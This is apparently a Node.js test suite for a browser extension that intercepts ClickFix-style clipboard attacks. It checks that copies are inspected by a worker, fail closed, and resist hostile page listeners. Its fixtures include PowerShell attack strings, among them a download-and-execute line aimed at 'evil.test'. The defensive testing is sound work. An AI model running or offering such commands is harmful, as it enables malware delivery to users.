const { test } = require("node:test");
const assert = require("node:assert/strict");

require("./clickfix-policy.js");
const CLICKFIX_SCRIPT_PATH = require.resolve("./clickfix.js");
const PAGE_HOOK_SCRIPT_PATH = require.resolve("./clickfix-page-hook.js");

function flush() {
  return new Promise((resolve) => setImmediate(resolve));
}

class FakeInputElement {
  constructor(value, start, end) {
    this.value = value;
    this.selectionStart = start;
    this.selectionEnd = end;
    this.dispatched = [];
  }

  setRangeText(replacement, start, end) {
    this.value = this.value.slice(0, start) + replacement + this.value.slice(end);
    this.selectionStart = start;
    this.selectionEnd = start;
  }

  dispatchEvent(event) {
    this.dispatched.push(event);
    return true;
  }
}

class FakeTextAreaElement extends FakeInputElement {}
class FakeShadowRoot {}
class FakeEvent {
  constructor(type, init = {}) {
    this.type = type;
    this.bubbles = init.bubbles === true;
    this.composed = init.composed === true;
    this.isTrusted = init.isTrusted === true;
    this.ctrlKey = init.ctrlKey === true;
    this.metaKey = init.metaKey === true;
    this.key = init.key;
    this.defaultPrevented = false;
    this.propagationStopped = false;
    this._target = null;
  }

  get target() {
    return this._target;
  }

  preventDefault() {
    this.defaultPrevented = true;
  }

  stopImmediatePropagation() {
    this.propagationStopped = true;
  }
}

class FakeCustomEvent extends FakeEvent {
  constructor(type, init = {}) {
    super(type, init);
    this._detail = init.detail;
  }

  get detail() {
    return this._detail;
  }
}

class FakeInputEvent extends FakeEvent {
  constructor(type, init = {}) {
    super(type, init);
    this.inputType = init.inputType;
    this.data = init.data;
  }
}

function createFakeEventTargetClass() {
  return class FakeEventTarget {
  constructor() {
    this.listeners = new Map();
  }

  addEventListener(type, listener, options = false) {
    const capture = options === true || options?.capture === true;
    const once = options !== null && typeof options === "object" && options.once === true;
    if (!this.listeners.has(type)) this.listeners.set(type, []);
    if (this.listeners.get(type).some((entry) => entry.listener === listener && entry.capture === capture)) return;
    this.listeners.get(type).push({ listener, capture, once });
  }

  removeEventListener(type, listener, options = false) {
    const capture = options === true || options?.capture === true;
    const entries = this.listeners.get(type) ?? [];
    this.listeners.set(type, entries.filter((entry) => entry.listener !== listener || entry.capture !== capture));
  }

  dispatchEvent(event) {
    event._target = this;
    for (const entry of [...(this.listeners.get(event.type) ?? [])]) {
      if (entry.once) this.removeEventListener(event.type, entry.listener, entry.capture);
      entry.listener.call(this, event);
      if (event.propagationStopped) break;
    }
    return !event.defaultPrevented;
  }
  };
}

function clipboardEvent(type, explicitText, { isTrusted = true } = {}) {
  const written = new Map();
  const event = new FakeEvent(type, { isTrusted });
  event.clipboardData = {
      getData(format) {
        return format === "text/plain" ? explicitText ?? "" : "";
      },
      clearData() {
        written.clear();
      },
      setData(format, value) {
        written.set(format, String(value));
      },
    };
  Object.defineProperty(event, "writtenText", {
    configurable: true,
    get() {
      return written.get("text/plain");
    },
  });
  return event;
}

async function loadClickfix({
  href = "https://page.test/instructions",
  clipboardResponse = { ok: true, status: "copied" },
  userActivation = true,
  documentFocused = true,
  permissionsPolicy = true,
  permissionsPolicySupported = true,
  installMainHook = false,
} = {}) {
  const PerLoadEventTarget = createFakeEventTargetClass();
  const runtimeListeners = [];
  const sentMessages = [];
  const postedMessages = [];
  const bridgeResults = [];
  const mutationObservers = [];
  let implicitDocumentWriteCallback = null;
  let nextClipboardResponse = clipboardResponse;
  let activeElement = null;
  let selection = {
    text: "",
    deleted: false,
    toString() {
      return this.text;
    },
    deleteFromDocument() {
      this.deleted = true;
    },
  };

  class FakeWindow extends PerLoadEventTarget {
    postMessage(data) {
      postedMessages.push(data);
      const event = new FakeEvent("message");
      event.data = data;
      event.source = this;
      this.dispatchEvent(event);
    }

    getSelection() {
      return selection;
    }

    setTimeout(callback, delay) {
      return setTimeout(callback, delay);
    }

    clearTimeout(timerId) {
      clearTimeout(timerId);
    }
  }

  class FakeDocument extends PerLoadEventTarget {
    constructor() {
      super();
      this.documentElement = { generation: 0 };
      this.nativeExecCommandCalls = [];
      if (permissionsPolicySupported) {
        this.permissionsPolicy = {
          allowsFeature(feature) {
            return feature === "clipboard-write" && permissionsPolicy === true;
          },
        };
      }
    }

    get activeElement() {
      return activeElement;
    }

    hasFocus() {
      return documentFocused;
    }

    open() {
      fakeWindow.listeners.clear();
      this.listeners.clear();
      this.documentElement = { generation: this.documentElement.generation + 1 };
      for (const observer of mutationObservers) {
        queueMicrotask(() => observer.callback([{ type: "childList", target: this }], observer));
      }
      return this;
    }

    write() {
      if (implicitDocumentWriteCallback !== null) {
        // Model a post-parser document.write() that performs an implicit
        // document.open() and executes inline code before write() returns.
        fakeWindow.listeners.clear();
        this.listeners.clear();
        this.documentElement = { generation: this.documentElement.generation + 1 };
        implicitDocumentWriteCallback();
        for (const observer of mutationObservers) {
          queueMicrotask(() => observer.callback([{ type: "childList", target: this }], observer));
        }
      }
      return undefined;
    }

    writeln() {
      return undefined;
    }

    execCommand(command) {
      this.nativeExecCommandCalls.push(command);
      const event = clipboardEvent(String(command).toLowerCase(), "");
      fakeWindow.dispatchEvent(event);
      return !event.defaultPrevented;
    }
  }

  class FakeClipboard {
    constructor() {
      this.nativeWriteTextCalls = [];
      this.nativeWriteCalls = [];
    }

    writeText(text) {
      this.nativeWriteTextCalls.push(text);
      return Promise.resolve();
    }

    write(items) {
      this.nativeWriteCalls.push(items);
      return Promise.resolve();
    }
  }

  class FakeMutationObserver {
    constructor(callback) {
      this.callback = callback;
      this.target = null;
      this.options = null;
      mutationObservers.push(this);
    }

    observe(target, options) {
      this.target = target;
      this.options = options;
    }
  }

  const fakeWindow = new FakeWindow();
  const fakeDocument = new FakeDocument();
  const fakeClipboard = installMainHook ? new FakeClipboard() : undefined;
  let bridgeNames = null;
  fakeDocument.addEventListener("__yodelphish_clickfix_bootstrap_v1__", (event) => {
    bridgeNames = JSON.parse(event.detail);
  }, { capture: true });

  const fakeChrome = {
    runtime: {
      onMessage: {
        addListener(listener) {
          runtimeListeners.push(listener);
        },
      },
      sendMessage(message) {
        sentMessages.push(structuredClone(message));
        if (message.type === "clickfix_clipboard_request") {
          if (nextClipboardResponse instanceof Error) return Promise.reject(nextClipboardResponse);
          return Promise.resolve(nextClipboardResponse);
        }
        return Promise.resolve({ ok: true });
      },
    },
  };

  global.window = fakeWindow;
  global.document = fakeDocument;
  global.chrome = fakeChrome;
  global.location = new URL(href);
  Object.defineProperty(global, "navigator", {
    configurable: true,
    value: { userActivation: { isActive: userActivation }, clipboard: fakeClipboard },
  });
  global.HTMLInputElement = FakeInputElement;
  global.HTMLTextAreaElement = FakeTextAreaElement;
  global.ShadowRoot = FakeShadowRoot;
  global.InputEvent = FakeInputEvent;
  global.Event = FakeEvent;
  global.CustomEvent = FakeCustomEvent;
  global.EventTarget = PerLoadEventTarget;
  global.Document = FakeDocument;
  global.MutationObserver = FakeMutationObserver;
  global.Clipboard = FakeClipboard;
  global.ClipboardItem = undefined;
  let randomWord = 0;
  Object.defineProperty(global, "crypto", {
    configurable: true,
    value: {
      getRandomValues(words) {
        for (let index = 0; index < words.length; index += 1) {
          randomWord += 1;
          words[index] = randomWord;
        }
        return words;
      },
    },
  });

  delete require.cache[PAGE_HOOK_SCRIPT_PATH];
  delete require.cache[CLICKFIX_SCRIPT_PATH];
  if (installMainHook) require(PAGE_HOOK_SCRIPT_PATH);
  require(CLICKFIX_SCRIPT_PATH);
  await flush();

  if (bridgeNames !== null) {
    fakeDocument.addEventListener(bridgeNames.resultEventName, (event) => {
      bridgeResults.push(JSON.parse(event.detail));
    });
  }

  function dispatch(type, event) {
    fakeWindow.dispatchEvent(event);
    return event;
  }

  return {
    sentMessages,
    postedMessages,
    setActiveElement(value) {
      activeElement = value;
    },
    setSelectionText(text) {
      selection = {
        text,
        deleted: false,
        toString() {
          return this.text;
        },
        deleteFromDocument() {
          this.deleted = true;
        },
      };
      return selection;
    },
    setClipboardResponse(response) {
      nextClipboardResponse = response;
    },
    dispatchCopy(text, options) {
      return dispatch("copy", clipboardEvent("copy", text, options));
    },
    dispatchCut(text) {
      return dispatch("cut", clipboardEvent("cut", text));
    },
    async dispatchBridgeRequest(text, {
      requestId = "request-1",
      operation = "writeText",
    } = {}) {
      if (bridgeNames === null) throw new Error("private bridge was not bootstrapped");
      fakeDocument.dispatchEvent(new FakeCustomEvent(bridgeNames.requestEventName, {
        detail: JSON.stringify({ requestId, operation, text }),
        bubbles: false,
        composed: false,
      }));
      await flush();
      return bridgeResults.find((result) => result.requestId === requestId);
    },
    async forgePublicRequest(text, requestId = "forged") {
      fakeWindow.postMessage({
        channel: "yodelphish-clickfix",
        kind: "request",
        requestId,
        operation: "writeText",
        text,
      });
      await flush();
    },
    async forgeFromKeydown(text) {
      fakeWindow.addEventListener("keydown", () => {
        fakeWindow.postMessage({
          channel: "yodelphish-clickfix",
          kind: "request",
          requestId: "keydown-forgery",
          operation: "writeText",
          text,
        });
      }, { once: true });
      fakeWindow.dispatchEvent(new FakeEvent("keydown", { isTrusted: true }));
      await flush();
    },
    invokeGenuineWrapperFromKeydown(text) {
      let writePromise;
      let handlerRan = false;
      fakeWindow.addEventListener("keydown", () => {
        handlerRan = true;
        writePromise = fakeClipboard.writeText(text);
      }, { once: true });
      fakeWindow.dispatchEvent(new FakeEvent("keydown", {
        isTrusted: true,
        ctrlKey: true,
        key: "c",
      }));
      return { handlerRan, writePromise };
    },
    fakeClipboard,
    async dispatchRuntimeMessage(message) {
      for (const listener of runtimeListeners) {
        let callbackResponse;
        const response = listener(message, {}, (value) => {
          callbackResponse = value;
        });
        if (callbackResponse !== undefined) return callbackResponse;
        if (response !== false && response !== undefined) return await response;
      }
      return undefined;
    },
    async simulateDocumentReplacement() {
      fakeDocument.open();
      // Observer callbacks, followed by the isolated recovery acknowledgement,
      // all run at microtask checkpoints rather than inside document.open().
      await Promise.resolve();
      await Promise.resolve();
    },
    async persistentListenerOrderAttack({ implicit = false } = {}) {
      let hostileHandlerRan = false;
      let hostileKeydownHandlerRan = false;
      let propertyHandlerRan = false;
      let keydownPropertyHandlerRan = false;
      let hostileListenerRegistered = false;
      let hostileKeydownListenerRegistered = false;
      const installHostileHandlers = () => {
        // Exercise the same-realm prototype call as well as the oncopy setter;
        // neither may acquire an earlier Window slot while recovery is active.
        const hostileListener = () => {
          hostileHandlerRan = true;
        };
        EventTarget.prototype.addEventListener.call(fakeWindow, "copy", hostileListener, { capture: true });
        hostileListenerRegistered = (fakeWindow.listeners.get("copy") ?? [])
          .some((entry) => entry.listener === hostileListener);
        const hostileKeydownListener = () => {
          hostileKeydownHandlerRan = true;
        };
        EventTarget.prototype.addEventListener.call(
          fakeWindow,
          "keydown",
          hostileKeydownListener,
          { capture: true }
        );
        hostileKeydownListenerRegistered = (fakeWindow.listeners.get("keydown") ?? [])
          .some((entry) => entry.listener === hostileKeydownListener);
        fakeWindow.oncopy = () => {
          propertyHandlerRan = true;
        };
        fakeWindow.onkeydown = () => {
          keydownPropertyHandlerRan = true;
        };
      };

      if (implicit) {
        implicitDocumentWriteCallback = installHostileHandlers;
        fakeDocument.write("<script>install hostile copy handler</script>");
        implicitDocumentWriteCallback = null;
      } else {
        fakeDocument.open();
        installHostileHandlers();
      }

      await Promise.resolve();
      await Promise.resolve();
      const keydownEvent = new FakeEvent("keydown", {
        isTrusted: true,
        ctrlKey: true,
        key: "c",
      });
      fakeWindow.dispatchEvent(keydownEvent);
      const programmaticStatus = await fakeClipboard.writeText("ordinary competing text")
        .then(() => "copied", () => "blocked");
      selection = {
        text: "powershell -c inspected",
        deleted: false,
        toString() { return this.text; },
        deleteFromDocument() { this.deleted = true; },
      };
      const manualEvent = new FakeEvent("copy", { isTrusted: true });
      fakeWindow.dispatchEvent(manualEvent);
      await flush();
      return {
        addEventListenerName: EventTarget.prototype.addEventListener.name,
        documentWriteName: fakeDocument.write.name,
        hostileHandlerRan,
        hostileListenerRegistered,
        hostileKeydownHandlerRan,
        hostileKeydownListenerRegistered,
        propertyHandlerRan,
        keydownPropertyHandlerRan,
        propertyHandler: fakeWindow.oncopy,
        keydownPropertyHandler: fakeWindow.onkeydown,
        keydownEvent,
        programmaticStatus,
        manualEvent,
      };
    },
    async ordinaryWriteListenerOrderAttack() {
      let hostileHandlerRan = false;
      let hostileKeydownHandlerRan = false;
      EventTarget.prototype.addEventListener.call(fakeWindow, "copy", () => {
        hostileHandlerRan = true;
      }, { capture: true });
      EventTarget.prototype.addEventListener.call(fakeWindow, "keydown", () => {
        hostileKeydownHandlerRan = true;
      }, { capture: true });
      fakeDocument.write("ordinary parser content");
      const keydownEvent = new FakeEvent("keydown", {
        isTrusted: true,
        ctrlKey: true,
        key: "c",
      });
      fakeWindow.dispatchEvent(keydownEvent);
      selection = {
        text: "powershell -c inspected",
        deleted: false,
        toString() { return this.text; },
        deleteFromDocument() { this.deleted = true; },
      };
      const manualEvent = new FakeEvent("copy", { isTrusted: true });
      fakeWindow.dispatchEvent(manualEvent);
      await flush();
      return { hostileHandlerRan, hostileKeydownHandlerRan, keydownEvent, manualEvent };
    },
    sameTaskDocumentReplacementAttack() {
      fakeDocument.open();
      let hostileHandlerRan = false;
      fakeWindow.addEventListener("copy", () => {
        hostileHandlerRan = true;
      }, { capture: true });
      const manualEvent = new FakeEvent("copy", { isTrusted: true });
      fakeWindow.dispatchEvent(manualEvent);
      return {
        hostileHandlerRan,
        manualEvent,
        execCommandResult: fakeDocument.execCommand("copy"),
        nativeExecCommandCalls: [...fakeDocument.nativeExecCommandCalls],
      };
    },
    lastMessage(type) {
      return [...sentMessages].reverse().find((message) => message.type === type);
    },
  };
}

test("an allowed trusted copy is cancelled and delegated as an exact snapshot", async () => {
  const page = await loadClickfix();
  const event = page.dispatchCopy("ordinary documentation text");
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.propagationStopped, true);
  assert.equal(event.writtenText, undefined);
  assert.deepEqual(page.lastMessage("clickfix_clipboard_request"), {
    type: "clickfix_clipboard_request",
    operation: "copy",
    text: "ordinary documentation text",
  });
});

test("a file page mediates ClickFix clipboard writes when the content scripts are present", async () => {
  const page = await loadClickfix({
    href: "file:///home/user/captcha.html",
    installMainHook: true,
  });
  const command = "powershell -c evil";

  await assert.doesNotReject(page.fakeClipboard.writeText(command));

  assert.deepEqual(page.lastMessage("clickfix_clipboard_request"), {
    type: "clickfix_clipboard_request",
    operation: "writeText",
    text: command,
  });
  assert.deepEqual(page.fakeClipboard.nativeWriteTextCalls, []);
});

test("a suspicious trusted copy is always delegated to the authoritative worker", async () => {
  const page = await loadClickfix({ clipboardResponse: { ok: true, status: "warning" } });
  const command = "powershell -ExecutionPolicy Bypass -Command evil";
  const event = page.dispatchCopy(command);
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.writtenText, undefined);
  assert.deepEqual(page.lastMessage("clickfix_clipboard_request"), {
    type: "clickfix_clipboard_request",
    operation: "copy",
    text: command,
  });
});

test("an untrusted copy event is cancelled without opening a warning", async () => {
  const page = await loadClickfix();
  const event = page.dispatchCopy("powershell -c evil", { isTrusted: false });
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.propagationStopped, true);
  assert.equal(event.writtenText, undefined);
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("a trusted manual copy without active user activation fails closed", async () => {
  const page = await loadClickfix({ userActivation: false });
  const event = page.dispatchCopy("ordinary documentation text");
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.propagationStopped, true);
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("a later page copy handler cannot replace an allowed selection", async () => {
  const page = await loadClickfix();
  const event = page.dispatchCopy("benign selection");

  // stopImmediatePropagation prevents the simulated hostile page handler from
  // replacing the extension-owned event data after inspection.
  if (!event.propagationStopped) {
    event.clipboardData.setData("text/plain", "powershell -c evil");
  }
  assert.equal(event.writtenText, undefined);
  await flush();
  assert.equal(page.lastMessage("clickfix_clipboard_request").text, "benign selection");
});

test("a legacy copy with no inspectable value is denied by default", async () => {
  const page = await loadClickfix();
  page.setSelectionText("");
  const event = page.dispatchCopy(undefined);

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.propagationStopped, true);
  assert.equal(event.writtenText, undefined);
});

test("cut deletes its exact input range only after the worker confirms copied", async () => {
  let resolveWorker;
  const workerResponse = new Promise((resolve) => {
    resolveWorker = resolve;
  });
  const page = await loadClickfix({ clipboardResponse: workerResponse });
  const input = new FakeInputElement("before ordinary after", 7, 15);
  page.setActiveElement(input);

  const event = page.dispatchCut(undefined);
  assert.equal(event.writtenText, undefined);
  assert.equal(input.value, "before ordinary after");

  resolveWorker({ ok: true, status: "copied" });
  await flush();
  assert.equal(input.value, "before  after");
  assert.equal(input.dispatched[0].inputType, "deleteByCut");
});

test("blocked and warning cut decisions never delete the selection", async () => {
  for (const status of ["blocked", "warning"]) {
    const page = await loadClickfix({ clipboardResponse: { ok: true, status } });
    const input = new FakeInputElement("before command after", 7, 14);
    page.setActiveElement(input);

    page.dispatchCut(undefined);
    await flush();
    assert.equal(input.value, "before command after");
  }
});

test("a stale warn-mode exclusion cannot restore native page clipboard behavior", async () => {
  const page = await loadClickfix({
    href: "https://docs.trusted.example/",
    clickfix: { mode: "warn", excluded_domains: ["trusted.example"] },
    clipboardResponse: { ok: true, status: "warning" },
  });
  const event = page.dispatchCopy("powershell iwr https://evil.test/a.ps1 | iex");
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.propagationStopped, true);
  assert.equal(event.writtenText, undefined);
  assert.equal(page.lastMessage("clickfix_clipboard_request").operation, "copy");
});

test("manual copy remains cancelled when runtime transport fails", async () => {
  const page = await loadClickfix({ clipboardResponse: new Error("worker unavailable") });
  const event = page.dispatchCopy("ordinary documentation text");
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.equal(event.writtenText, undefined);
  assert.equal(page.lastMessage("clickfix_clipboard_request").text, "ordinary documentation text");
});

test("trusted manual copy relays are locally bounded and fail closed", async () => {
  const page = await loadClickfix();
  const events = [];
  for (let index = 0; index < 9; index += 1) {
    events.push(page.dispatchCopy(`ordinary text ${index}`));
  }
  await flush();

  assert.equal(
    page.sentMessages.filter((message) => message.type === "clickfix_clipboard_request").length,
    8
  );
  assert.ok(events.every((event) => event.defaultPrevented && event.propagationStopped));
});

test("a trusted manual copy arms the programmatic-overwrite guard", async () => {
  const page = await loadClickfix({ installMainHook: true });
  page.setSelectionText("ordinary manual selection");

  const event = page.dispatchCopy("ordinary manual selection");
  const competingWrite = page.fakeClipboard.writeText("ordinary competing write");
  await assert.rejects(competingWrite, (error) => error.name === "NotAllowedError");
  await flush();

  assert.equal(event.defaultPrevented, true);
  assert.deepEqual(
    page.sentMessages.filter((message) => message.type === "clickfix_clipboard_request"),
    [{
      type: "clickfix_clipboard_request",
      operation: "copy",
      text: "ordinary manual selection",
    }]
  );
  assert.deepEqual(page.fakeClipboard.nativeWriteTextCalls, []);
});

test("the isolated document answers a worker liveness probe without exposing data", async () => {
  const page = await loadClickfix();
  assert.deepEqual(
    await page.dispatchRuntimeMessage({ type: "clickfix_validate_source_document" }),
    { ok: true }
  );
});

test("private and manual listeners recover after document-root replacement", async () => {
  const page = await loadClickfix({ installMainHook: true });
  await page.simulateDocumentReplacement();

  await assert.doesNotReject(page.fakeClipboard.writeText("ordinary wrapper text"));
  assert.equal(page.lastMessage("clickfix_clipboard_request").text, "ordinary wrapper text");

  page.setSelectionText("ordinary manual text");
  const event = page.dispatchCopy("ordinary manual text");
  await flush();
  assert.equal(event.defaultPrevented, true);
  assert.equal(page.lastMessage("clickfix_clipboard_request").text, "ordinary manual text");
});

test("document replacement cannot give a hostile Window copy listener priority", async () => {
  for (const implicit of [false, true]) {
    const page = await loadClickfix({ installMainHook: true });
    const attack = await page.persistentListenerOrderAttack({ implicit });

    assert.equal(attack.addEventListenerName, "protectedAddEventListener", implicit ? "implicit write" : "explicit open");
    assert.equal(attack.documentWriteName, "protectedDocumentWrite", implicit ? "implicit write" : "explicit open");
    assert.equal(attack.manualEvent.defaultPrevented, true, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.manualEvent.propagationStopped, true, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.hostileListenerRegistered, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.hostileKeydownListenerRegistered, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.hostileHandlerRan, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.hostileKeydownHandlerRan, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.propertyHandlerRan, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.keydownPropertyHandlerRan, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.propertyHandler, null, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.keydownPropertyHandler, null, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.keydownEvent.defaultPrevented, false, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.keydownEvent.propagationStopped, true, implicit ? "implicit write" : "explicit open");
    assert.equal(attack.programmaticStatus, "blocked", implicit ? "implicit write" : "explicit open");
    assert.deepEqual(page.lastMessage("clickfix_clipboard_request"), {
      type: "clickfix_clipboard_request",
      operation: "copy",
      text: "powershell -c inspected",
    });
  }
});

test("ordinary document.write keeps the original clipboard-gate priority", async () => {
  const page = await loadClickfix({ installMainHook: true });
  const attack = await page.ordinaryWriteListenerOrderAttack();

  assert.equal(attack.manualEvent.defaultPrevented, true);
  assert.equal(attack.manualEvent.propagationStopped, true);
  assert.equal(attack.hostileHandlerRan, false);
  assert.equal(attack.keydownEvent.defaultPrevented, false);
  assert.equal(attack.keydownEvent.propagationStopped, true);
  assert.equal(attack.hostileKeydownHandlerRan, false);
  assert.deepEqual(page.lastMessage("clickfix_clipboard_request"), {
    type: "clickfix_clipboard_request",
    operation: "copy",
    text: "powershell -c inspected",
  });
});

test("document.open has no same-task copy or execCommand gap before observer recovery", async () => {
  const page = await loadClickfix({ installMainHook: true });
  const attack = page.sameTaskDocumentReplacementAttack();

  assert.equal(attack.manualEvent.defaultPrevented, true);
  assert.equal(attack.manualEvent.propagationStopped, true);
  assert.equal(attack.hostileHandlerRan, false);
  assert.equal(attack.execCommandResult, false);
  assert.deepEqual(attack.nativeExecCommandCalls, []);

  await Promise.resolve();
  await Promise.resolve();
});

test("a genuine private wrapper request is inspected and only copied status is returned", async () => {
  const page = await loadClickfix({ clipboardResponse: { ok: true, status: "copied" } });
  const result = await page.dispatchBridgeRequest("ordinary text");

  assert.equal(page.lastMessage("clickfix_clipboard_request").text, "ordinary text");
  assert.equal(result.status, "copied");
});

test("blocked and failed background decisions never become copied bridge results", async () => {
  const page = await loadClickfix({ clipboardResponse: { ok: true, status: "blocked" } });
  assert.equal((await page.dispatchBridgeRequest("powershell -c evil", { requestId: "one" })).status, "blocked");

  page.setClipboardResponse({ ok: false, code: "rate_limited" });
  assert.equal((await page.dispatchBridgeRequest("text", { requestId: "two" })).status, "error");
});

test("forged public window.postMessage requests have no clipboard authority", async () => {
  const page = await loadClickfix();
  await page.forgePublicRequest("powershell -c evil");

  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("a public bridge forgery from a trusted keydown cannot borrow user activation", async () => {
  const page = await loadClickfix({ userActivation: true });
  await page.forgeFromKeydown("powershell -c evil");

  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("a hostile keydown handler cannot use the genuine wrapper to overwrite manual copy", async () => {
  const page = await loadClickfix({ installMainHook: true, userActivation: true });

  const attempt = page.invokeGenuineWrapperFromKeydown("powershell -c evil");
  assert.equal(attempt.handlerRan, false);
  assert.equal(attempt.writePromise, undefined);
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
  assert.deepEqual(page.fakeClipboard.nativeWriteTextCalls, []);
});

test("over-limit bridge text fails closed before background transport", async () => {
  const page = await loadClickfix();
  const result = await page.dispatchBridgeRequest("x".repeat(65_537), { requestId: "large" });

  assert.equal(result.status, "blocked");
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("the private bridge cannot create a gestureless clipboard-write capability", async () => {
  const page = await loadClickfix({ userActivation: false });
  const result = await page.dispatchBridgeRequest("ordinary text", { requestId: "no-gesture" });

  assert.equal(result.status, "blocked");
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("the private bridge fails closed for an unfocused document", async () => {
  const page = await loadClickfix({ documentFocused: false });
  const result = await page.dispatchBridgeRequest("ordinary text", { requestId: "unfocused" });

  assert.equal(result.status, "blocked");
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("the private bridge fails closed when clipboard-write policy is absent", async () => {
  const page = await loadClickfix({ permissionsPolicySupported: false });
  const result = await page.dispatchBridgeRequest("ordinary text", { requestId: "no-policy" });

  assert.equal(result.status, "blocked");
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});

test("the private bridge fails closed when clipboard-write policy denies the frame", async () => {
  const page = await loadClickfix({ permissionsPolicy: false });
  const result = await page.dispatchBridgeRequest("ordinary text", { requestId: "policy-denied" });

  assert.equal(result.status, "blocked");
  assert.equal(page.lastMessage("clickfix_clipboard_request"), undefined);
});
